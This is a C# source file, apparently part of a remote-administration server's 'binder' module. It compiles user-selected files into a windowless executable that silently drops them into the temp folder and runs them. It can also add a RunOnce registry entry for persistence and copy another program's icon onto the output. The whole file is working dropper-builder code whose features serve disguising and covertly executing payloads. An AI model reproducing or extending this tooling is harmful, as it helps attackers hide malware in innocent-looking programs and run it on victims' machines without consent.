using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SeroServer.Binder;

public class BinderEntry
{
    public string FilePath  { get; set; } = "";
    public string FileName  => Path.GetFileName(FilePath);
    public long   FileSize  { get; set; }
    public string SizeDisplay => FileSize >= 1024 * 1024
        ? $"{FileSize / 1024.0 / 1024:F1} MB"
        : FileSize >= 1024 ? $"{FileSize / 1024:N0} KB" : $"{FileSize} B";
    public bool   RunOnce  { get; set; }
    public System.Windows.Media.Imaging.BitmapSource? Icon { get; set; }
}

public static class BinderBuilder
{
    private const int    RT_ICON       = 3;
    private const int    RT_GROUP_ICON = 14;
    private const ushort LANG_NEUTRAL  = 0;

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern nint BeginUpdateResource(string pFileName, bool bDeleteExistingResources);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UpdateResource(nint hUpdate, nint lpType, nint lpName, ushort wLanguage, byte[]? lpData, uint cb);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool EndUpdateResource(nint hUpdate, bool fDiscard);

    public static async Task<string> Build(
        IList<BinderEntry> entries,
        string?            iconSourcePath,
        string             outputPath,
        Action<string>     progress)
    {
        if (entries.Count == 0) return "Aucun fichier ajouté.";

        var csc = FindCsc();
        if (csc == null) return "csc.exe introuvable — .NET Framework 4.x requis.";

        var tmp = Path.Combine(Path.GetTempPath(), $"serobinder_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tmp);
        try
        {
            progress("Copie des fichiers…");

            // Sanitize & deduplicate names
            var fileNames = new List<string>();
            for (int i = 0; i < entries.Count; i++)
            {
                var name = Path.GetFileName(entries[i].FilePath);
                if (fileNames.Contains(name, StringComparer.OrdinalIgnoreCase))
                    name = $"{i}_{name}";
                fileNames.Add(name);
                File.Copy(entries[i].FilePath, Path.Combine(tmp, name), overwrite: true);
            }

            // Generate loader source
            progress("Génération du code…");
            File.WriteAllText(Path.Combine(tmp, "Program.cs"), GenerateCode(entries, fileNames), Encoding.UTF8);

            // Build /resource arguments
            var resources = new StringBuilder();
            foreach (var n in fileNames)
                resources.Append($" /resource:\"{Path.Combine(tmp, n)}\",\"{n}\"");

            var outExe = Path.Combine(tmp, "binder_out.exe");
            var args   = $"/target:winexe /platform:x64 /optimize+ /nologo /out:\"{outExe}\" \"{Path.Combine(tmp, "Program.cs")}\"{resources}";

            progress("Compilation (.NET 4.8)…");
            var psi = new ProcessStartInfo(csc, args)
            {
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var proc = Process.Start(psi)!;
            var stdoutTask = proc.StandardOutput.ReadToEndAsync();
            var stderrTask = proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();
            var compileOutput = ((await stdoutTask) + "\n" + (await stderrTask)).Trim();

            if (proc.ExitCode != 0 || !File.Exists(outExe))
                return $"Erreur de compilation :\n{compileOutput}";

            Directory.CreateDirectory(Path.GetDirectoryName(outputPath)!);
            File.Copy(outExe, outputPath, overwrite: true);

            if (!string.IsNullOrEmpty(iconSourcePath) && File.Exists(iconSourcePath))
            {
                progress("Application de l'icône…");
                try { ApplyIcon(outputPath, iconSourcePath); }
                catch (Exception ex) { progress($"Avertissement icône : {ex.Message}"); }
            }

            return "OK";
        }
        catch (Exception ex) { return $"Erreur : {ex.Message}"; }
        finally { try { Directory.Delete(tmp, true); } catch { } }
    }

    // ── Code generation ─────────────────────────────────────────────────

    private static string GenerateCode(IList<BinderEntry> entries, IList<string> fileNames)
    {
        bool anyRunOnce = entries.Any(e => e.RunOnce);
        var sb = new StringBuilder();
        sb.AppendLine("using System;");
        sb.AppendLine("using System.Diagnostics;");
        sb.AppendLine("using System.IO;");
        sb.AppendLine("using System.Reflection;");
        if (anyRunOnce) sb.AppendLine("using Microsoft.Win32;");
        sb.AppendLine("class B {");
        sb.AppendLine("    static void Main() {");
        sb.AppendLine("        string t = Path.GetTempPath();");
        sb.AppendLine("        Assembly a = Assembly.GetExecutingAssembly();");
        for (int i = 0; i < entries.Count; i++)
        {
            var n  = fileNames[i].Replace("\\", "\\\\").Replace("\"", "\\\"");
            var ro = entries[i].RunOnce ? "true" : "false";
            sb.AppendLine($"        Drop(a,t,\"{n}\",{ro});");
        }
        sb.AppendLine("    }");
        sb.AppendLine("    static void Drop(Assembly a,string t,string name,bool ro){");
        sb.AppendLine("        try{");
        sb.AppendLine("            Stream s=a.GetManifestResourceStream(name);");
        sb.AppendLine("            if(s==null)return;");
        sb.AppendLine("            byte[] b=new byte[s.Length];s.Read(b,0,b.Length);s.Dispose();");
        sb.AppendLine("            string p=Path.Combine(t,name);");
        sb.AppendLine("            File.WriteAllBytes(p,b);");
        if (anyRunOnce)
            sb.AppendLine("            if(ro)try{var k=Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\",true);k?.SetValue(name,\"\\\"\" +p+ \"\\\"\");}catch{}");
        sb.AppendLine("            Process.Start(new ProcessStartInfo(p){UseShellExecute=true});");
        sb.AppendLine("        }catch{}");
        sb.AppendLine("    }");
        sb.AppendLine("}");
        return sb.ToString();
    }

    // ── csc.exe discovery ───────────────────────────────────────────────

    private static string? FindCsc()
    {
        var fw = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows),
            "Microsoft.NET", "Framework64");
        if (!Directory.Exists(fw)) return null;
        foreach (var dir in Directory.GetDirectories(fw, "v*").OrderByDescending(d => d))
        {
            var csc = Path.Combine(dir, "csc.exe");
            if (File.Exists(csc)) return csc;
        }
        return null;
    }

    // ── Icon replacement ─────────────────────────────────────────────────

    private static void ApplyIcon(string exePath, string iconSource)
    {
        byte[] icoBytes;
        if (Path.GetExtension(iconSource).Equals(".ico", StringComparison.OrdinalIgnoreCase))
        {
            icoBytes = File.ReadAllBytes(iconSource);
        }
        else
        {
            using var icon = System.Drawing.Icon.ExtractAssociatedIcon(iconSource)
                ?? throw new InvalidOperationException("Impossible d'extraire l'icône.");
            using var ms = new MemoryStream();
            icon.Save(ms);
            icoBytes = ms.ToArray();
        }
        ApplyIco(exePath, icoBytes);
    }

    private static void ApplyIco(string exePath, byte[] icoBytes)
    {
        using var ms = new MemoryStream(icoBytes);
        using var br = new BinaryReader(ms);

        br.ReadUInt16(); // reserved
        br.ReadUInt16(); // type
        int count = br.ReadUInt16();

        var w   = new byte[count];   var h  = new byte[count];
        var cc  = new byte[count];   var rs = new byte[count];
        var pl  = new ushort[count]; var bc = new ushort[count];
        var sz  = new uint[count];   var of = new uint[count];

        for (int i = 0; i < count; i++)
        {
            w[i] = br.ReadByte(); h[i] = br.ReadByte();
            cc[i] = br.ReadByte(); rs[i] = br.ReadByte();
            pl[i] = br.ReadUInt16(); bc[i] = br.ReadUInt16();
            sz[i] = br.ReadUInt32(); of[i] = br.ReadUInt32();
        }

        using var groupMs = new MemoryStream();
        using var bw      = new BinaryWriter(groupMs);
        bw.Write((ushort)0); bw.Write((ushort)1); bw.Write((ushort)count);
        for (int i = 0; i < count; i++)
        {
            bw.Write(w[i]); bw.Write(h[i]); bw.Write(cc[i]); bw.Write(rs[i]);
            bw.Write(pl[i]); bw.Write(bc[i]); bw.Write(sz[i]);
            bw.Write((ushort)(i + 1));
        }
        var groupData = groupMs.ToArray();

        var hUpdate = BeginUpdateResource(exePath, false);
        if (hUpdate == IntPtr.Zero) throw new InvalidOperationException("BeginUpdateResource failed.");
        try
        {
            for (int i = 0; i < count; i++)
            {
                var img = new byte[sz[i]];
                Array.Copy(icoBytes, of[i], img, 0, (int)sz[i]);
                UpdateResource(hUpdate, RT_ICON, i + 1, LANG_NEUTRAL, img, (uint)img.Length);
            }
            UpdateResource(hUpdate, RT_GROUP_ICON, 1, LANG_NEUTRAL, groupData, (uint)groupData.Length);
        }
        finally { EndUpdateResource(hUpdate, false); }
    }
}
